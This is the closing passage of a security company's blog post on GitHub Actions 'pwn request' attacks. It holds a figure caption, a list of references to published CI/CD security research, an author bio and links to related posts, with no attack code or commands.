![](data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20647%20440'%3E%3C/svg%3E)

_Figure 21: GitHub roadmap tile for LLM powered pull-request features._

## References

Pwn requests have been around for a long time, and many security researchers have blogged about them extensively. These attacks and this blog post would not have been possible without the following resources:

  * Karim Rahal Leaking GItHub Actions Secrets – <https://karimrahal.com/2023/01/05/github-actions-leaking-secrets/>
  * PwnHub by Nikita Stupin – <https://github.com/nikitastupin/pwnhub>
  * GitHub Security Lab posts – <https://securitylab.github.com/research/github-actions-preventing-pwn-requests/>
  * Cycode – OSS Software GitHub Actions Vulnerabilities – <https://cycode.com/github-actions-vulnerabilities/>
  * GitGuardian – GitHub Actions Security Cheat Sheet – <https://blog.gitguardian.com/github-actions-security-cheat-sheet/>

_Praetorian is a cybersecurity company that provides offensive security services with the goal of collaboratively strengthening our clients’ security posture. To learn more about our research into CI/CD pipeline security, check out our post on[GATO](/blog/introducing-gato-for-ci-cd-exploitation/). For more on how we can help identify your supply chain vulnerabilities so you can close your gaps, check out our [CI/CD security offering](/offensive-security-services/ci-cd-security-engagement/) or [Vendor Risk Management Use Case](/third-party-vendor-risk-management/)._

## About the Authors

![Adnan Khan](data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%200%200'%3E%3C/svg%3E)

### [Adnan Khan](https://www.praetorian.com/author/adnan-khan/)

Adnan focuses on Red-Teaming, DevOps Security, and Exploit Development.

[ ](https://www.linkedin.com/in/adnanekhan)

## Catch the Latest

Catch our latest exploits, news, articles, and events.

[](https://www.praetorian.com/blog/wasmforge-csharp-ghostpack-edr-evasion/)

  * [Offensive Security](https://www.praetorian.com/category/offensive-security/), [Vulnerability Research](https://www.praetorian.com/category/vulnerability-research/)

  * June 19, 2026

[](https://www.praetorian.com/blog/wasmforge-csharp-ghostpack-edr-evasion/)

## [GhostPack Necromancy: Reforging C# Tools with WasmForge](https://www.praetorian.com/blog/wasmforge-csharp-ghostpack-edr-evasion/)

[ Read More ](https://www.praetorian.com/blog/wasmforge-csharp-ghostpack-edr-evasion/)

[](https://www.praetorian.com/blog/ai-vulnerability-research-freebsd-kernel/)

  * [Offensive Security](https://www.praetorian.com/category/offensive-security/), [Vulnerability Research](https://www.praetorian.com/category/vulnerability-research/)

  * June 17, 2026

[](https://www.praetorian.com/blog/ai-vulnerability-research-freebsd-kernel/)

## [FreeBSoD: Leveraging Language Models to Find and Exploit Kernel Bugs (Part 1 of 2)](https://www.praetorian.com/blog/ai-vulnerability-research-freebsd-kernel/)

[ Read More ](https://www.praetorian.com/blog/ai-vulnerability-research-freebsd-kernel/)

[](https://www.praetorian.com/blog/sharing-is-caring-smb-secret-scanning-with-sulla/)

  * [Uncategorized](https://www.praetorian.com/category/uncategorized/)

  * June 16, 2026

[](https://www.praetorian.com/blog/sharing-is-caring-smb-secret-scanning-with-sulla/)

## [Sharing is Caring: SMB Secret Scanning with Sulla](https://www.praetorian.com/blog/sharing-is-caring-smb-secret-scanning-with-sulla/)

[ Read More ](https://www.praetorian.com/blog/sharing-is-caring-smb-secret-scanning-with-sulla/)

## Ready to Discuss Your Next Continuous Threat Exposure Management Initiative?

Praetorian’s Offense Security Experts are Ready to Answer Your Questions

[ Get Started ](/contact-us/)

[ ![Praetorian](https://www.praetorian.com/wp-content/uploads/2025/10/praetorian-logo-final-white.svg) ](https://www.praetorian.com)

##### [Praetorian Guard Platform](https://www.praetorian.com/guard)

  * [ Continuous Threat Exposure Management ](https://www.praetorian.com/guard/continuous-threat-exposure-management/)
  * [ Attack Surface Management ](https://www.praetorian.com/guard/attack-surface-management/)
  * [ Vulnerability Management ](/chariot/vulnerability-management/)
  * [ Cyber Threat Intelligence ](/chariot/threat-intelligence/)
  * [ Continuous Penetration Testing ](https://www.praetorian.com/guard/continuous-penetration-testing/)
  * [ Breach and Attack Simulation ](https://www.praetorian.com/guard/breach-attack-simulation/)

##### Professional Services

  * [ AI/ML Penetration Testing ](https://www.praetorian.com/services/ai-ml-penetration-testing/)
  * [ Application Penetration Testing ](/services/application-penetration-testing/)
  * [ Assumed Breached Exercise ](/services/assumed-breached-exercise/)
  * [ Attack Path Mapping ](https://www.praetorian.com/resources/attack-path-mapping/)
  * [ Automotive Penetration Testing ](/services/automotive-penetration-testing/#)
  * [ CI/CD Security Engagement ](/services/ci-cd-security-engagement/)
  * [ Cloud Penetration Testing ](/services/cloud-penetration-testing/)
  * [ IoT Penetration Testing ](/services/iot-penetration-testing/)
  * [ Network Penetration Testing ](/services/network-penetration-testing/)
  * [ NIST CSF Benchmark ](/services/nist-csf-benchmark/)
  * [ Purple Team ](/services/purple-team/)
  * [ Red Team ](/services/red-team/)

##### Use Cases

  * [ Bug Bounty Cost Reduction ](/services/bug-bounty-cost-reduction/)
  * [ FDA Testing and Monitoring ](/services/fda-testing-monitoring/)
  * [ Mergers and Acquisitions ](/services/mergers-acquisitions/)
  * [ Ransomware Prevention ](/services/ransomware-prevention/)
  * [ Rogue IT Identification ](/services/rogue-it-identification/)
  * [ Tool and Vendor Consolidation ](/services/tool-vendor-consolidation/)
  * [ Vendor Risk Management ](https://www.praetorian.com/services/vendor-risk-management/)

##### Company

  * [ About Us ](https://www.praetorian.com/about-us/)
  * [ Leadership Team ](https://www.praetorian.com/leadership-team/)
  * [ Press Releases ](/news/press-release/)
  * [ In the News ](/news/news)
  * [ Contact Us ](https://www.praetorian.com/contact-us/)
  * [ Resource Library ](https://www.praetorian.com/resources/)
  * [ Security Blog ](/blog/)
  * [ People Ops Blog ](/people-ops/)
  * [ Careers ](https://www.praetorian.com/careers/)
  * [ Culture ](https://www.praetorian.com/work-at-praetorian/)
  * [ Survival Kit ](/wp-content/uploads/2024/11/Praetorian-Survival-Guide.pdf)

### Subscribe to our Newsletter

Catch our latest exploits, news, articles, and events.

[Privacy Policy](/privacy-policy/) | [Responsible Disclosure Policy](/responsible-disclosure-policy/) | [Terms of Service](/terms-of-service/) | [Terms and Conditions](/terms/)

Copyright © 2025. All Rights Reserved.

[ Linkedin-in ](https://www.linkedin.com/company/praetorian/) [ X-twitter ](https://twitter.com/praetorianlabs) [ Facebook-f ](https://www.facebook.com/praetorianlabs) [ Github ](https://github.com/praetorian-inc) [ Youtube ](https://www.youtube.com/user/PraetorianLabs)
